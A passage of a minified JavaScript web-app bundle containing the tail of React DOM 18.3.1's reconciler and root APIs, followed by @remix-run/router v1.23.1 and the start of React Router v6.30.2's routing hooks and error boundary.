14:n=Xs(null,n,r,Le(r.type,e),t);break e}throw Error(x(306,r,""))}return n;case 0:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),Fl(e,n,r,i,t);case 1:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),qs(e,n,r,i,t);case 3:e:{if(dc(n),e===null)throw Error(x(387));r=n.pendingProps,l=n.memoizedState,i=l.element,zu(e,n),ri(n,r,null,t);var o=n.memoizedState;if(r=o.element,l.isDehydrated)if(l={element:r,isDehydrated:!1,cache:o.cache,pendingSuspenseBoundaries:o.pendingSuspenseBoundaries,transitions:o.transitions},n.updateQueue.baseState=l,n.memoizedState=l,n.flags&256){i=ct(Error(x(423)),n),n=Js(e,n,r,t,i);break e}else if(r!==i){i=ct(Error(x(424)),n),n=Js(e,n,r,t,i);break e}else for(ve=cn(n.stateNode.containerInfo.firstChild),ye=n,B=!0,je=null,t=Iu(n,null,r,t),n.child=t;t;)t.flags=t.flags&-3|4096,t=t.sibling;else{if(st(),r===i){n=Xe(e,n,t);break e}se(e,n,r,t)}n=n.child}return n;case 5:return Bu(n),e===null&&Ml(n),r=n.type,i=n.pendingProps,l=e!==null?e.memoizedProps:null,o=i.children,Ll(r,i)?o=null:l!==null&&Ll(r,l)&&(n.flags|=32),cc(e,n),se(e,n,o,t),n.child;case 6:return e===null&&Ml(n),null;case 13:return fc(e,n,t);case 4:return jo(n,n.stateNode.containerInfo),r=n.pendingProps,e===null?n.child=at(n,null,r,t):se(e,n,r,t),n.child;case 11:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),Ys(e,n,r,i,t);case 7:return se(e,n,n.pendingProps,t),n.child;case 8:return se(e,n,n.pendingProps.children,t),n.child;case 12:return se(e,n,n.pendingProps.children,t),n.child;case 10:e:{if(r=n.type._context,i=n.pendingProps,l=n.memoizedProps,o=i.value,I(ni,r._currentValue),r._currentValue=o,l!==null)if(Me(l.value,o)){if(l.children===i.children&&!pe.current){n=Xe(e,n,t);break e}}else for(l=n.child,l!==null&&(l.return=n);l!==null;){var s=l.dependencies;if(s!==null){o=l.child;for(var a=s.firstContext;a!==null;){if(a.context===r){if(l.tag===1){a=Ge(-1,t&-t),a.tag=2;var c=l.updateQueue;if(c!==null){c=c.shared;var g=c.pending;g===null?a.next=a:(a.next=g.next,g.next=a),c.pending=a}}l.lanes|=t,a=l.alternate,a!==null&&(a.lanes|=t),Il(l.return,t,n),s.lanes|=t;break}a=a.next}}else if(l.tag===10)o=l.type===n.type?null:l.child;else if(l.tag===18){if(o=l.return,o===null)throw Error(x(341));o.lanes|=t,s=o.alternate,s!==null&&(s.lanes|=t),Il(o,t,n),o=l.sibling}else o=l.child;if(o!==null)o.return=l;else for(o=l;o!==null;){if(o===n){o=null;break}if(l=o.sibling,l!==null){l.return=o.return,o=l;break}o=o.return}l=o}se(e,n,i.children,t),n=n.child}return n;case 9:return i=n.type,r=n.pendingProps.children,rt(n,t),i=Te(i),r=r(i),n.flags|=1,se(e,n,r,t),n.child;case 14:return r=n.type,i=Le(r,n.pendingProps),i=Le(r.type,i),Xs(e,n,r,i,t);case 15:return ac(e,n,n.type,n.pendingProps,t);case 17:return r=n.type,i=n.pendingProps,i=n.elementType===r?i:Le(r,i),zr(e,n),n.tag=1,he(r)?(e=!0,Jr(n)):e=!1,rt(n,t),lc(n,r,i),zl(n,r,i,t),Ul(null,n,r,!0,e,t);case 19:return pc(e,n,t);case 22:return uc(e,n,t)}throw Error(x(156,n.tag))};function Nc(e,n){return tu(e,n)}function mp(e,n,t,r){this.tag=e,this.key=t,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=n,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=r,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Ee(e,n,t,r){return new mp(e,n,t,r)}function Qo(e){return e=e.prototype,!(!e||!e.isReactComponent)}function gp(e){if(typeof e=="function")return Qo(e)?1:0;if(e!=null){if(e=e.$$typeof,e===fo)return 11;if(e===po)return 14}return 2}function hn(e,n){var t=e.alternate;return t===null?(t=Ee(e.tag,n,e.key,e.mode),t.elementType=e.elementType,t.type=e.type,t.stateNode=e.stateNode,t.alternate=e,e.alternate=t):(t.pendingProps=n,t.type=e.type,t.flags=0,t.subtreeFlags=0,t.deletions=null),t.flags=e.flags&14680064,t.childLanes=e.childLanes,t.lanes=e.lanes,t.child=e.child,t.memoizedProps=e.memoizedProps,t.memoizedState=e.memoizedState,t.updateQueue=e.updateQueue,n=e.dependencies,t.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext},t.sibling=e.sibling,t.index=e.index,t.ref=e.ref,t}function Ur(e,n,t,r,i,l){var o=2;if(r=e,typeof e=="function")Qo(e)&&(o=1);else if(typeof e=="string")o=5;else e:switch(e){case Hn:return On(t.children,i,l,n);case co:o=8,i|=8;break;case al:return e=Ee(12,t,n,i|2),e.elementType=al,e.lanes=l,e;case ul:return e=Ee(13,t,n,i),e.elementType=ul,e.lanes=l,e;case cl:return e=Ee(19,t,n,i),e.elementType=cl,e.lanes=l,e;case Ba:return Ei(t,i,l,n);default:if(typeof e=="object"&&e!==null)switch(e.$$typeof){case Da:o=10;break e;case za:o=9;break e;case fo:o=11;break e;case po:o=14;break e;case Ze:o=16,r=null;break e}throw Error(x(130,e==null?e:typeof e,""))}return n=Ee(o,t,n,i),n.elementType=e,n.type=r,n.lanes=l,n}function On(e,n,t,r){return e=Ee(7,e,r,n),e.lanes=t,e}function Ei(e,n,t,r){return e=Ee(22,e,r,n),e.elementType=Ba,e.lanes=t,e.stateNode={isHidden:!1},e}function il(e,n,t){return e=Ee(6,e,null,n),e.lanes=t,e}function ll(e,n,t){return n=Ee(4,e.children!==null?e.children:[],e.key,n),n.lanes=t,n.stateNode={containerInfo:e.containerInfo,pendingChildren:null,implementation:e.implementation},n}function vp(e,n,t,r,i){this.tag=n,this.containerInfo=e,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Bi(0),this.expirationTimes=Bi(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Bi(0),this.identifierPrefix=r,this.onRecoverableError=i,this.mutableSourceEagerHydrationData=null}function Ko(e,n,t,r,i,l,o,s,a){return e=new vp(e,n,t,s,a),n===1?(n=1,l===!0&&(n|=8)):n=0,l=Ee(3,null,null,n),e.current=l,l.stateNode=e,l.memoizedState={element:r,isDehydrated:t,cache:null,transitions:null,pendingSuspenseBoundaries:null},Oo(l),e}function yp(e,n,t){var r=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:Un,key:r==null?null:""+r,children:e,containerInfo:n,implementation:t}}function Lc(e){if(!e)return vn;e=e._reactInternals;e:{if(zn(e)!==e||e.tag!==1)throw Error(x(170));var n=e;do{switch(n.tag){case 3:n=n.stateNode.context;break e;case 1:if(he(n.type)){n=n.stateNode.__reactInternalMemoizedMergedChildContext;break e}}n=n.return}while(n!==null);throw Error(x(171))}if(e.tag===1){var t=e.type;if(he(t))return Lu(e,t,n)}return n}function Oc(e,n,t,r,i,l,o,s,a){return e=Ko(t,r,!0,e,i,l,o,s,a),e.context=Lc(null),t=e.current,r=ae(),i=pn(t),l=Ge(r,i),l.callback=n??null,dn(t,l,i),e.current.lanes=i,lr(e,i,r),me(e,r),e}function Ci(e,n,t,r){var i=n.current,l=ae(),o=pn(i);return t=Lc(t),n.context===null?n.context=t:n.pendingContext=t,n=Ge(l,o),n.payload={element:e},r=r===void 0?null:r,r!==null&&(n.callback=r),e=dn(i,n,o),e!==null&&(Ae(e,i,o,l),Mr(e,i,o)),o}function di(e){if(e=e.current,!e.child)return null;switch(e.child.tag){case 5:return e.child.stateNode;default:return e.child.stateNode}}function aa(e,n){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var t=e.retryLane;e.retryLane=t!==0&&t<n?t:n}}function Yo(e,n){aa(e,n),(e=e.alternate)&&aa(e,n)}function wp(){return null}var jc=typeof reportError=="function"?reportError:function(e){console.error(e)};function Xo(e){this._internalRoot=e}Ti.prototype.render=Xo.prototype.render=function(e){var n=this._internalRoot;if(n===null)throw Error(x(409));Ci(e,n,null,null)};Ti.prototype.unmount=Xo.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var n=e.containerInfo;In(function(){Ci(null,e,null,null)}),n[Ke]=null}};function Ti(e){this._internalRoot=e}Ti.prototype.unstable_scheduleHydration=function(e){if(e){var n=uu();e={blockedOn:null,target:e,priority:n};for(var t=0;t<nn.length&&n!==0&&n<nn[t].priority;t++);nn.splice(t,0,e),t===0&&du(e)}};function qo(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11)}function Pi(e){return!(!e||e.nodeType!==1&&e.nodeType!==9&&e.nodeType!==11&&(e.nodeType!==8||e.nodeValue!==" react-mount-point-unstable "))}function ua(){}function kp(e,n,t,r,i){if(i){if(typeof r=="function"){var l=r;r=function(){var c=di(o);l.call(c)}}var o=Oc(n,r,e,0,null,!1,!1,"",ua);return e._reactRootContainer=o,e[Ke]=o.current,Qt(e.nodeType===8?e.parentNode:e),In(),o}for(;i=e.lastChild;)e.removeChild(i);if(typeof r=="function"){var s=r;r=function(){var c=di(a);s.call(c)}}var a=Ko(e,0,!1,null,null,!1,!1,"",ua);return e._reactRootContainer=a,e[Ke]=a.current,Qt(e.nodeType===8?e.parentNode:e),In(function(){Ci(n,a,t,r)}),a}function _i(e,n,t,r,i){var l=t._reactRootContainer;if(l){var o=l;if(typeof i=="function"){var s=i;i=function(){var a=di(o);s.call(a)}}Ci(n,o,e,i)}else o=kp(t,n,e,i,r);return di(o)}su=function(e){switch(e.tag){case 3:var n=e.stateNode;if(n.current.memoizedState.isDehydrated){var t=_t(n.pendingLanes);t!==0&&(go(n,t|1),me(n,G()),!(A&6)&&(dt=G()+500,kn()))}break;case 13:In(function(){var r=Ye(e,1);if(r!==null){var i=ae();Ae(r,e,1,i)}}),Yo(e,1)}};vo=function(e){if(e.tag===13){var n=Ye(e,134217728);if(n!==null){var t=ae();Ae(n,e,134217728,t)}Yo(e,134217728)}};au=function(e){if(e.tag===13){var n=pn(e),t=Ye(e,n);if(t!==null){var r=ae();Ae(t,e,n,r)}Yo(e,n)}};uu=function(){return M};cu=function(e,n){var t=M;try{return M=e,n()}finally{M=t}};kl=function(e,n,t){switch(n){case"input":if(pl(e,t),n=t.name,t.type==="radio"&&n!=null){for(t=e;t.parentNode;)t=t.parentNode;for(t=t.querySelectorAll("input[name="+JSON.stringify(""+n)+'][type="radio"]'),n=0;n<t.length;n++){var r=t[n];if(r!==e&&r.form===e.form){var i=yi(r);if(!i)throw Error(x(90));Ua(r),pl(r,i)}}}break;case"textarea":Va(e,t);break;case"select":n=t.value,n!=null&&Zn(e,!!t.multiple,n,!1)}};Xa=Wo;qa=In;var xp={usingClientEntryPoint:!1,Events:[sr,Gn,yi,Ka,Ya,Wo]},Ct={findFiberByHostInstance:Pn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Sp={bundleType:Ct.bundleType,version:Ct.version,rendererPackageName:Ct.rendererPackageName,rendererConfig:Ct.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:qe.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=eu(e),e===null?null:e.stateNode},findFiberByHostInstance:Ct.findFiberByHostInstance||wp,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Nr=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Nr.isDisabled&&Nr.supportsFiber)try{hi=Nr.inject(Sp),Be=Nr}catch{}}ke.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=xp;ke.createPortal=function(e,n){var t=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!qo(n))throw Error(x(200));return yp(e,n,null,t)};ke.createRoot=function(e,n){if(!qo(e))throw Error(x(299));var t=!1,r="",i=jc;return n!=null&&(n.unstable_strictMode===!0&&(t=!0),n.identifierPrefix!==void 0&&(r=n.identifierPrefix),n.onRecoverableError!==void 0&&(i=n.onRecoverableError)),n=Ko(e,1,!1,null,null,t,!1,r,i),e[Ke]=n.current,Qt(e.nodeType===8?e.parentNode:e),new Xo(n)};ke.findDOMNode=function(e){if(e==null)return null;if(e.nodeType===1)return e;var n=e._reactInternals;if(n===void 0)throw typeof e.render=="function"?Error(x(188)):(e=Object.keys(e).join(","),Error(x(268,e)));return e=eu(n),e=e===null?null:e.stateNode,e};ke.flushSync=function(e){return In(e)};ke.hydrate=function(e,n,t){if(!Pi(n))throw Error(x(200));return _i(null,e,n,!0,t)};ke.hydrateRoot=function(e,n,t){if(!qo(e))throw Error(x(405));var r=t!=null&&t.hydratedSources||null,i=!1,l="",o=jc;if(t!=null&&(t.unstable_strictMode===!0&&(i=!0),t.identifierPrefix!==void 0&&(l=t.identifierPrefix),t.onRecoverableError!==void 0&&(o=t.onRecoverableError)),n=Oc(n,null,e,1,t??null,i,!1,l,o),e[Ke]=n.current,Qt(e),r)for(e=0;e<r.length;e++)t=r[e],i=t._getVersion,i=i(t._source),n.mutableSourceEagerHydrationData==null?n.mutableSourceEagerHydrationData=[t,i]:n.mutableSourceEagerHydrationData.push(t,i);return new Ti(n)};ke.render=function(e,n,t){if(!Pi(n))throw Error(x(200));return _i(null,e,n,!1,t)};ke.unmountComponentAtNode=function(e){if(!Pi(e))throw Error(x(40));return e._reactRootContainer?(In(function(){_i(null,null,e,!1,function(){e._reactRootContainer=null,e[Ke]=null})}),!0):!1};ke.unstable_batchedUpdates=Wo;ke.unstable_renderSubtreeIntoContainer=function(e,n,t,r){if(!Pi(t))throw Error(x(200));if(e==null||e._reactInternals===void 0)throw Error(x(38));return _i(e,n,t,!1,r)};ke.version="18.3.1-next-f1338f8080-20240426";function Rc(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Rc)}catch(e){console.error(e)}}Rc(),Ra.exports=ke;var bp=Ra.exports,Ac,ca=bp;Ac=ca.createRoot,ca.hydrateRoot;/**
 * @remix-run/router v1.23.1
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function tr(){return tr=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r])}return e},tr.apply(this,arguments)}var on;(function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"})(on||(on={}));const da="popstate";function Ep(e){e===void 0&&(e={});function n(r,i){let{pathname:l,search:o,hash:s}=r.location;return Zl("",{pathname:l,search:o,hash:s},i.state&&i.state.usr||null,i.state&&i.state.key||"default")}function t(r,i){return typeof i=="string"?i:fi(i)}return Tp(n,t,null,e)}function K(e,n){if(e===!1||e===null||typeof e>"u")throw new Error(n)}function Jo(e,n){if(!e){typeof console<"u"&&console.warn(n);try{throw new Error(n)}catch{}}}function Cp(){return Math.random().toString(36).substr(2,8)}function fa(e,n){return{usr:e.state,key:e.key,idx:n}}function Zl(e,n,t,r){return t===void 0&&(t=null),tr({pathname:typeof e=="string"?e:e.pathname,search:"",hash:""},typeof n=="string"?mt(n):n,{state:t,key:n&&n.key||r||Cp()})}function fi(e){let{pathname:n="/",search:t="",hash:r=""}=e;return t&&t!=="?"&&(n+=t.charAt(0)==="?"?t:"?"+t),r&&r!=="#"&&(n+=r.charAt(0)==="#"?r:"#"+r),n}function mt(e){let n={};if(e){let t=e.indexOf("#");t>=0&&(n.hash=e.substr(t),e=e.substr(0,t));let r=e.indexOf("?");r>=0&&(n.search=e.substr(r),e=e.substr(0,r)),e&&(n.pathname=e)}return n}function Tp(e,n,t,r){r===void 0&&(r={});let{window:i=document.defaultView,v5Compat:l=!1}=r,o=i.history,s=on.Pop,a=null,c=g();c==null&&(c=0,o.replaceState(tr({},o.state,{idx:c}),""));function g(){return(o.state||{idx:null}).idx}function h(){s=on.Pop;let E=g(),f=E==null?null:E-c;c=E,a&&a({action:s,location:k.location,delta:f})}function m(E,f){s=on.Push;let d=Zl(k.location,E,f);c=g()+1;let p=fa(d,c),y=k.createHref(d);try{o.pushState(p,"",y)}catch(b){if(b instanceof DOMException&&b.name==="DataCloneError")throw b;i.location.assign(y)}l&&a&&a({action:s,location:k.location,delta:1})}function v(E,f){s=on.Replace;let d=Zl(k.location,E,f);c=g();let p=fa(d,c),y=k.createHref(d);o.replaceState(p,"",y),l&&a&&a({action:s,location:k.location,delta:0})}function w(E){let f=i.location.origin!=="null"?i.location.origin:i.location.href,d=typeof E=="string"?E:fi(E);return d=d.replace(/ $/,"%20"),K(f,"No window.location.(origin|href) available to create URL for href: "+d),new URL(d,f)}let k={get action(){return s},get location(){return e(i,o)},listen(E){if(a)throw new Error("A history only accepts one active listener");return i.addEventListener(da,h),a=E,()=>{i.removeEventListener(da,h),a=null}},createHref(E){return n(i,E)},createURL:w,encodeLocation(E){let f=w(E);return{pathname:f.pathname,search:f.search,hash:f.hash}},push:m,replace:v,go(E){return o.go(E)}};return k}var pa;(function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"})(pa||(pa={}));function Pp(e,n,t){return t===void 0&&(t="/"),_p(e,n,t)}function _p(e,n,t,r){let i=typeof n=="string"?mt(n):n,l=Zo(i.pathname||"/",t);if(l==null)return null;let o=Mc(e);Np(o);let s=null;for(let a=0;s==null&&a<o.length;++a){let c=Up(l);s=zp(o[a],c)}return s}function Mc(e,n,t,r){n===void 0&&(n=[]),t===void 0&&(t=[]),r===void 0&&(r="");let i=(l,o,s)=>{let a={relativePath:s===void 0?l.path||"":s,caseSensitive:l.caseSensitive===!0,childrenIndex:o,route:l};a.relativePath.startsWith("/")&&(K(a.relativePath.startsWith(r),'Absolute route path "'+a.relativePath+'" nested under path '+('"'+r+'" is not valid. An absolute child route path ')+"must start with the combined path of all its parent routes."),a.relativePath=a.relativePath.slice(r.length));let c=mn([r,a.relativePath]),g=t.concat(a);l.children&&l.children.length>0&&(K(l.index!==!0,"Index routes must not have child routes. Please remove "+('all child routes from route path "'+c+'".')),Mc(l.children,n,g,c)),!(l.path==null&&!l.index)&&n.push({path:c,score:Ip(c,l.index),routesMeta:g})};return e.forEach((l,o)=>{var s;if(l.path===""||!((s=l.path)!=null&&s.includes("?")))i(l,o);else for(let a of Ic(l.path))i(l,o,a)}),n}function Ic(e){let n=e.split("/");if(n.length===0)return[];let[t,...r]=n,i=t.endsWith("?"),l=t.replace(/\?$/,"");if(r.length===0)return i?[l,""]:[l];let o=Ic(r.join("/")),s=[];return s.push(...o.map(a=>a===""?l:[l,a].join("/"))),i&&s.push(...o),s.map(a=>e.startsWith("/")&&a===""?"/":a)}function Np(e){e.sort((n,t)=>n.score!==t.score?t.score-n.score:Dp(n.routesMeta.map(r=>r.childrenIndex),t.routesMeta.map(r=>r.childrenIndex)))}const Lp=/^:[\w-]+$/,Op=3,jp=2,Rp=1,Ap=10,Mp=-2,ha=e=>e==="*";function Ip(e,n){let t=e.split("/"),r=t.length;return t.some(ha)&&(r+=Mp),n&&(r+=jp),t.filter(i=>!ha(i)).reduce((i,l)=>i+(Lp.test(l)?Op:l===""?Rp:Ap),r)}function Dp(e,n){return e.length===n.length&&e.slice(0,-1).every((r,i)=>r===n[i])?e[e.length-1]-n[n.length-1]:0}function zp(e,n,t){let{routesMeta:r}=e,i={},l="/",o=[];for(let s=0;s<r.length;++s){let a=r[s],c=s===r.length-1,g=l==="/"?n:n.slice(l.length)||"/",h=Bp({path:a.relativePath,caseSensitive:a.caseSensitive,end:c},g),m=a.route;if(!h)return null;Object.assign(i,h.params),o.push({params:i,pathname:mn([l,h.pathname]),pathnameBase:Gp(mn([l,h.pathnameBase])),route:m}),h.pathnameBase!=="/"&&(l=mn([l,h.pathnameBase]))}return o}function Bp(e,n){typeof e=="string"&&(e={path:e,caseSensitive:!1,end:!0});let[t,r]=Fp(e.path,e.caseSensitive,e.end),i=n.match(t);if(!i)return null;let l=i[0],o=l.replace(/(.)\/+$/,"$1"),s=i.slice(1);return{params:r.reduce((c,g,h)=>{let{paramName:m,isOptional:v}=g;if(m==="*"){let k=s[h]||"";o=l.slice(0,l.length-k.length).replace(/(.)\/+$/,"$1")}const w=s[h];return v&&!w?c[m]=void 0:c[m]=(w||"").replace(/%2F/g,"/"),c},{}),pathname:l,pathnameBase:o,pattern:e}}function Fp(e,n,t){n===void 0&&(n=!1),t===void 0&&(t=!0),Jo(e==="*"||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were '+('"'+e.replace(/\*$/,"/*")+'" because the `*` character must ')+"always follow a `/` in the pattern. To get rid of this warning, "+('please change the route path to "'+e.replace(/\*$/,"/*")+'".'));let r=[],i="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(o,s,a)=>(r.push({paramName:s,isOptional:a!=null}),a?"/?([^\\/]+)?":"/([^\\/]+)"));return e.endsWith("*")?(r.push({paramName:"*"}),i+=e==="*"||e==="/*"?"(.*)$":"(?:\\/(.+)|\\/*)$"):t?i+="\\/*$":e!==""&&e!=="/"&&(i+="(?:(?=\\/|$))"),[new RegExp(i,n?void 0:"i"),r]}function Up(e){try{return e.split("/").map(n=>decodeURIComponent(n).replace(/\//g,"%2F")).join("/")}catch(n){return Jo(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent '+("encoding ("+n+").")),e}}function Zo(e,n){if(n==="/")return e;if(!e.toLowerCase().startsWith(n.toLowerCase()))return null;let t=n.endsWith("/")?n.length-1:n.length,r=e.charAt(t);return r&&r!=="/"?null:e.slice(t)||"/"}const Hp=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,Vp=e=>Hp.test(e);function Wp(e,n){n===void 0&&(n="/");let{pathname:t,search:r="",hash:i=""}=typeof e=="string"?mt(e):e,l;if(t)if(Vp(t))l=t;else{if(t.includes("//")){let o=t;t=t.replace(/\/\/+/g,"/"),Jo(!1,"Pathnames cannot have embedded double slashes - normalizing "+(o+" -> "+t))}t.startsWith("/")?l=ma(t.substring(1),"/"):l=ma(t,n)}else l=n;return{pathname:l,search:Qp(r),hash:Kp(i)}}function ma(e,n){let t=n.replace(/\/+$/,"").split("/");return e.split("/").forEach(i=>{i===".."?t.length>1&&t.pop():i!=="."&&t.push(i)}),t.length>1?t.join("/"):"/"}function ol(e,n,t,r){return"Cannot include a '"+e+"' character in a manually specified "+("`to."+n+"` field ["+JSON.stringify(r)+"].  Please separate it out to the ")+("`to."+t+"` field. Alternatively you may provide the full path as ")+'a string in <Link to="..."> and the router will parse it for you.'}function $p(e){return e.filter((n,t)=>t===0||n.route.path&&n.route.path.length>0)}function Dc(e,n){let t=$p(e);return n?t.map((r,i)=>i===t.length-1?r.pathname:r.pathnameBase):t.map(r=>r.pathnameBase)}function zc(e,n,t,r){r===void 0&&(r=!1);let i;typeof e=="string"?i=mt(e):(i=tr({},e),K(!i.pathname||!i.pathname.includes("?"),ol("?","pathname","search",i)),K(!i.pathname||!i.pathname.includes("#"),ol("#","pathname","hash",i)),K(!i.search||!i.search.includes("#"),ol("#","search","hash",i)));let l=e===""||i.pathname==="",o=l?"/":i.pathname,s;if(o==null)s=t;else{let h=n.length-1;if(!r&&o.startsWith("..")){let m=o.split("/");for(;m[0]==="..";)m.shift(),h-=1;i.pathname=m.join("/")}s=h>=0?n[h]:"/"}let a=Wp(i,s),c=o&&o!=="/"&&o.endsWith("/"),g=(l||o===".")&&t.endsWith("/");return!a.pathname.endsWith("/")&&(c||g)&&(a.pathname+="/"),a}const mn=e=>e.join("/").replace(/\/\/+/g,"/"),Gp=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),Qp=e=>!e||e==="?"?"":e.startsWith("?")?e:"?"+e,Kp=e=>!e||e==="#"?"":e.startsWith("#")?e:"#"+e;function Yp(e){return e!=null&&typeof e.status=="number"&&typeof e.statusText=="string"&&typeof e.internal=="boolean"&&"data"in e}const Bc=["post","put","patch","delete"];new Set(Bc);const Xp=["get",...Bc];new Set(Xp);/**
 * React Router v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function rr(){return rr=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var r in t)Object.prototype.hasOwnProperty.call(t,r)&&(e[r]=t[r])}return e},rr.apply(this,arguments)}const es=S.createContext(null),qp=S.createContext(null),Bn=S.createContext(null),Ni=S.createContext(null),xn=S.createContext({outlet:null,matches:[],isDataRoute:!1}),Fc=S.createContext(null);function Jp(e,n){let{relative:t}=n===void 0?{}:n;ur()||K(!1);let{basename:r,navigator:i}=S.useContext(Bn),{hash:l,pathname:o,search:s}=Vc(e,{relative:t}),a=o;return r!=="/"&&(a=o==="/"?r:mn([r,o])),i.createHref({pathname:a,search:s,hash:l})}function ur(){return S.useContext(Ni)!=null}function cr(){return ur()||K(!1),S.useContext(Ni).location}function Uc(e){S.useContext(Bn).static||S.useLayoutEffect(e)}function Hc(){let{isDataRoute:e}=S.useContext(xn);return e?fh():Zp()}function Zp(){ur()||K(!1);let e=S.useContext(es),{basename:n,future:t,navigator:r}=S.useContext(Bn),{matches:i}=S.useContext(xn),{pathname:l}=cr(),o=JSON.stringify(Dc(i,t.v7_relativeSplatPath)),s=S.useRef(!1);return Uc(()=>{s.current=!0}),S.useCallback(function(c,g){if(g===void 0&&(g={}),!s.current)return;if(typeof c=="number"){r.go(c);return}let h=zc(c,JSON.parse(o),l,g.relative==="path");e==null&&n!=="/"&&(h.pathname=h.pathname==="/"?n:mn([n,h.pathname])),(g.replace?r.replace:r.push)(h,g.state,g)},[n,r,o,l,e])}function eh(){let{matches:e}=S.useContext(xn),n=e[e.length-1];return n?n.params:{}}function Vc(e,n){let{relative:t}=n===void 0?{}:n,{future:r}=S.useContext(Bn),{matches:i}=S.useContext(xn),{pathname:l}=cr(),o=JSON.stringify(Dc(i,r.v7_relativeSplatPath));return S.useMemo(()=>zc(e,JSON.parse(o),l,t==="path"),[e,o,l,t])}function nh(e,n){return th(e,n)}function th(e,n,t,r){ur()||K(!1);let{navigator:i}=S.useContext(Bn),{matches:l}=S.useContext(xn),o=l[l.length-1],s=o?o.params:{};o&&o.pathname;let a=o?o.pathnameBase:"/";o&&o.route;let c=cr(),g;if(n){var h;let E=typeof n=="string"?mt(n):n;a==="/"||(h=E.pathname)!=null&&h.startsWith(a)||K(!1),g=E}else g=c;let m=g.pathname||"/",v=m;if(a!=="/"){let E=a.replace(/^\//,"").split("/");v="/"+m.replace(/^\//,"").split("/").slice(E.length).join("/")}let w=Pp(e,{pathname:v}),k=sh(w&&w.map(E=>Object.assign({},E,{params:Object.assign({},s,E.params),pathname:mn([a,i.encodeLocation?i.encodeLocation(E.pathname).pathname:E.pathname]),pathnameBase:E.pathnameBase==="/"?a:mn([a,i.encodeLocation?i.encodeLocation(E.pathnameBase).pathname:E.pathnameBase])})),l,t,r);return n&&k?S.createElement(Ni.Provider,{value:{location:rr({pathname:"/",search:"",hash:"",state:null,key:"default"},g),navigationType:on.Pop}},k):k}function rh(){let e=dh(),n=Yp(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),t=e instanceof Error?e.stack:null,i={padding:"0.5rem",backgroundColor:"rgba(200,200,200, 0.5)"};return S.createElement(S.Fragment,null,S.createElement("h2",null,"Unexpected Application Error!"),S.createElement("h3",{style:{fontStyle:"italic"}},n),t?S.createElement("pre",{style:i},t):null,null)}const ih=S.createElement(rh,null);class lh extends S.Component{constructor(n){super(n),this.state={location:n.location,revalidation:n.revalidation,error:n.error}}static getDerivedStateFromError(n){return{error:n}}static getDerivedStateFromProps(n,t){return t.location!==n.location||t.revalidation!=="idle"&&n.revalidation==="idle"?{error:n.error,location:n.location,revalidation:n.revalidation}:{error:n.error!==void 0?n.error:t.error,location:t.location,revalidation:n.revalidation||t.revalidation}}componentDidCatch(n,t){console.error("React Router caught the following error during render",n,t)}render(){return this.state.error!==void 0?S.createElement(xn.Provider,{value:this.props.routeContext},S.createElement(Fc.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function oh(e){let{routeContext:n,match:t,children:r}=e,i=S.useContext(es);return i&&i.static&&i.staticContext&&(t.route.errorElement||t.route.ErrorBoundary)&&(i.staticContext._deepestRenderedBoundaryId=t.route.id),S.createElement(xn.Provider,{value:n},r)}function sh(e,n,t,r){var i;if(n===void 0&&(n=[]),t===void 0&&(t=null),r===void 0&&(r=null),e==null){var l;if(!t)return null;if(t.errors)e=t.matches;else 